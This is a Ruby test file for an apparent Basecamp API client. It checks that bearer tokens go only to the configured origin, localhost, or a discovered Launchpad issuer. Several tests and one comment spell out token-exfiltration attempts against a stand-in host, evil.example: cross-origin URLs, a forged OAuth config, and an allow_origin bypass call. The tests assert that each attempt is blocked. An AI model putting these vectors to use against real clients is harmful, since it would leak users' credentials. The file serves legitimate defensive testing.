# frozen_string_literal: true

require "test_helper"

# Verifies the bearer token is only attached to the configured origin:
# absolute URLs on a foreign origin are rejected at the build_url chokepoint
# and the single_request attach-point backstop, while same-origin and localhost
# URLs (and the intentional cross-origin Launchpad call) still work.
class SameOriginCredentialTest < Minitest::Test
  include TestHelper

  def setup
    @config = default_config # base_url https://3.basecampapi.com
    @http = Basecamp::Http.new(config: @config, token_provider: test_token_provider)
  end

  def test_build_url_rejects_cross_origin_absolute_url
    error = assert_raises(Basecamp::UsageError) do
      @http.send(:build_url, "https://evil.example/x.json")
    end
    assert_match(/origin/, error.message)
  end

  def test_build_url_accepts_same_origin_absolute_url
    assert_equal "https://3.basecampapi.com/test.json",
      @http.send(:build_url, "https://3.basecampapi.com/test.json")
  end

  def test_build_url_accepts_localhost_absolute_url
    assert_equal "https://localhost:3000/x.json",
      @http.send(:build_url, "https://localhost:3000/x.json")
  end

  def test_build_url_accepts_localhost_http_absolute_url
    # Localhost may use plain HTTP for local development.
    assert_equal "http://localhost:3000/x.json",
      @http.send(:build_url, "http://localhost:3000/x.json")
  end

  def test_build_url_rejects_http_absolute_url
    assert_raises(Basecamp::UsageError) do
      @http.send(:build_url, "http://3.basecampapi.com/x.json")
    end
  end

  def test_get_rejects_cross_origin_without_token_egress
    error = assert_raises(Basecamp::UsageError) do
      @http.get("https://evil.example/steal.json")
    end
    assert_match(/origin/, error.message)
    assert_not_requested(:get, "https://evil.example/steal.json")
  end

  def test_same_origin_absolute_url_carries_token
    stub_request(:get, "https://3.basecampapi.com/page2.json")
      .with(headers: { "Authorization" => "Bearer #{access_token}" })
      .to_return(status: 200, body: "{}", headers: { "Content-Type" => "application/json" })

    response = @http.get("https://3.basecampapi.com/page2.json")
    assert_equal 200, response.status
    assert_requested(:get, "https://3.basecampapi.com/page2.json")
  end

  def test_get_absolute_allows_cross_origin_launchpad
    stub_request(:get, "https://launchpad.37signals.com/authorization.json")
      .with(headers: { "Authorization" => "Bearer #{access_token}" })
      .to_return(status: 200, body: '{"ok":true}', headers: { "Content-Type" => "application/json" })

    response = @http.get_absolute("https://launchpad.37signals.com/authorization.json")
    assert_equal 200, response.status
    assert_requested(:get, "https://launchpad.37signals.com/authorization.json")
  end

  def test_get_absolute_rejects_foreign_origin
    # get_absolute must not be a blanket origin-guard bypass: only the trusted
    # Launchpad authorization endpoint may receive credentials cross-origin.
    error = assert_raises(Basecamp::UsageError) do
      @http.get_absolute("https://evil.example/steal")
    end
    assert_match(/origin/, error.message)
    assert_not_requested(:get, "https://evil.example/steal")
  end

  def test_build_url_uppercase_scheme_treated_as_absolute
    # Schemes are case-insensitive (RFC 3986): an uppercase-scheme URL is still
    # absolute — same-origin passes through, foreign is rejected rather than
    # joined onto the base URL.
    assert_equal "HTTPS://3.basecampapi.com/test.json",
      @http.send(:build_url, "HTTPS://3.basecampapi.com/test.json")
    assert_raises(Basecamp::UsageError) do
      @http.send(:build_url, "HTTPS://evil.example/x.json")
    end
  end

  def test_get_absolute_rejects_non_http_scheme_for_localhost
    # The localhost carve-out is limited to HTTP(S): any other scheme must fail
    # closed before credentials could be attached.
    error = assert_raises(Basecamp::UsageError) do
      @http.get_absolute("ws://localhost:3000/x")
    end
    assert_match(/HTTPS/, error.message)
  end

  def test_get_absolute_rejects_foreign_authorization_shaped_url
    # The allowance keys off the exact Launchpad URL, not the path shape, so a
    # foreign host whose path merely ends in /authorization.json is still
    # rejected before any token egress.
    error = assert_raises(Basecamp::UsageError) do
      @http.get_absolute("https://evil.example/authorization.json")
    end
    assert_match(/origin/, error.message)
    assert_not_requested(:get, "https://evil.example/authorization.json")
  end

  def test_get_absolute_no_longer_accepts_raw_trusted_origin
    # The raw-string trusted-origin escape hatch is GONE: get_absolute takes no
    # allow_origin parameter, so the classic attack
    #   get_absolute("https://evil.example/authorization.json",
    #                allow_origin: "https://evil.example")
    # (same-origin, valid https, yet no discovery provenance) cannot even be
    # expressed — it raises ArgumentError rather than leaking the token.
    assert_raises(ArgumentError) do
      @http.get_absolute(
        "https://evil.example/authorization.json",
        allow_origin: "https://evil.example"
      )
    end
    assert_not_requested(:get, "https://evil.example/authorization.json")
  end

  def test_manually_constructed_config_cannot_egress_credentials_cross_origin
    # Security regression. Basecamp::Oauth::Config is publicly constructible, so a
    # caller can forge one pointing at an attacker origin. The pre-fix vector — a
    # public method (get_from_selected_issuer) that credentialed whatever origin a
    # caller-supplied Config named — has been REMOVED. No public API consumes a
    # caller-supplied config/issuer/origin to authorize a credentialed request, so
    # a forged issuer is never contacted.
    forged = Basecamp::Oauth::Config.new(
      issuer: "https://evil.example",
      token_endpoint: "https://evil.example/token"
    )
    evil = stub_request(:get, "https://evil.example/authorization.json")

    assert_not @http.respond_to?(:get_from_selected_issuer),
      "the config-taking credentialed fetch must not exist"
    # The sole credentialed-authorization fetch takes NO caller argument: its
    # issuer is derived from discovery of the configured base URL, so a forged
    # Config/origin can never reach it.
    assert_equal 0, @http.method(:get_authorization_document).arity
    assert_not_nil forged
    assert_not_requested(evil)
  end

  def test_get_authorization_document_credentials_only_the_discovered_issuer
    # The sanctioned cross-origin path: resource-first discovery of the CONFIGURED
    # base URL selects a distinct web issuer, and ONLY that discovered-and-validated
    # issuer is credentialed at the fixed authorization.json path. A foreign origin
    # is never contacted, and no caller supplies the issuer or the path.
    base = @config.base_url
    bc5 = "https://bc5.example.test"
    stub_request(:get, "#{base}/.well-known/oauth-protected-resource")
      .to_return(status: 200,
        body: { resource: base, authorization_servers: [ bc5, "https://launchpad.37signals.com" ] }.to_json,
        headers: { "Content-Type" => "application/json" })
    stub_request(:get, "#{bc5}/.well-known/oauth-authorization-server")
      .to_return(status: 200,
        body: { issuer: bc5, token_endpoint: "#{bc5}/oauth/token" }.to_json,
        headers: { "Content-Type" => "application/json" })
    doc = stub_request(:get, "#{bc5}/authorization.json")
      .with(headers: { "Authorization" => "Bearer #{access_token}" })
      .to_return(status: 200, body: "{}", headers: { "Content-Type" => "application/json" })

    response = @http.get_authorization_document
    assert_equal 200, response.status
    assert_requested(doc)
    assert_not_requested(:get, "https://evil.example/authorization.json")
  end
end
